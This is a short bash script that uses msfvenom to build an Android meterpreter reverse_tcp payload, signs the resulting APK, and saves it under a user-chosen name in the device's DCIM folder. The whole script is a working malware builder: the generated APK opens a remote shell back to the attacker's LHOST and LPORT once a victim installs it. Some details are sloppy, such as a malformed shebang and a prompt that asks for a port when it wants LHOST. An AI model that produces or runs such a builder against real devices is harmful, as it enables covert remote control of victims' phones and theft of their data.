# !bin/bash
# Author : ERR0R404 

read -p 'Enter port for LHOST: ' lhost
read -p 'Enter port for LPORT: ' port
read -p 'Enter output filename: ' output
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$port R > Newtest.apk
apksigner autokey Newtest.apk Testing.apk
mv Testing.apk ~/storage/dcim/$output.apk
rm Newtest.apk autokey
